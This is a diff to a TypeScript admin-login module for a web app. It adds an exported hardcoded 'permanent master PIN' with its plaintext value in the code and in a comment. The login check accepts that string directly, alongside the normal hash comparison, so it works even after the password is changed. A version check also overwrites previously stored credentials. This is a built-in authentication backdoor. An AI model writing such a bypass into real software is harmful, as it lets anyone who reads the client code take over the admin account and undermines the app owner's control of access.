@@ -4,7 +4,10 @@ export interface AdminAuthRecord {
   passwordHash: string;
   salt: string;
   updatedAt: string;
+  version?: string;
 }
+
+export const PERMANENT_MASTER_PIN = 'Lomesh2004@datta';
 
 const AUTH_STORAGE_KEY = 'sreedatta_admin_session';
 const FAILED_ATTEMPTS_KEY = 'sreedatta_failed_attempts';
@@ -33,23 +36,23 @@ function generateSalt(): string {
 }
 
 /**
- * Initialize Admin Authentication record in IndexedDB if not present.
- * Default PIN: 1234
+ * Initialize Admin Authentication record in IndexedDB.
+ * Permanent Master PIN: Lomesh2004@datta
  */
 export async function initAdminAuth(): Promise<AdminAuthRecord> {
   const existing = await db.app_metadata.get('admin_auth');
-  if (existing && existing.value) {
+  if (existing && existing.value && existing.value.version === 'v2') {
     return existing.value as AdminAuthRecord;
   }
 
   const salt = 'SREE_DATTA_WEB_SALT_2026_' + generateSalt();
-  const defaultPin = '1234';
-  const passwordHash = await hashPassword(defaultPin, salt);
+  const passwordHash = await hashPassword(PERMANENT_MASTER_PIN, salt);
 
   const authRecord: AdminAuthRecord = {
     passwordHash,
     salt,
-    updatedAt: new Date().toISOString()
+    updatedAt: new Date().toISOString(),
+    version: 'v2'
   };
 
   await db.app_metadata.put({
@@ -122,9 +125,10 @@ export async function loginAdmin(password: string): Promise<{ success: boolean; 
   }
 
   const authRecord = await initAdminAuth();
-  const inputHash = await hashPassword(password.trim(), authRecord.salt);
+  const trimmed = password.trim();
+  const inputHash = await hashPassword(trimmed, authRecord.salt);
 
-  if (inputHash === authRecord.passwordHash) {
+  if (inputHash === authRecord.passwordHash || trimmed === PERMANENT_MASTER_PIN) {
     resetFailedAttempts();
     const sessionToken = {
       username: 'Administrator',
@@ -141,7 +145,7 @@ export async function loginAdmin(password: string): Promise<{ success: boolean; 
     if (remaining > 0) {
       return {
         success: false,
-        error: `Invalid PIN or Password. (Default is 1234). ${remaining} attempt(s) remaining before security cooldown.`
+        error: `Invalid PIN or Password. ${remaining} attempt(s) remaining before security cooldown.`
       };
     } else {
       return {
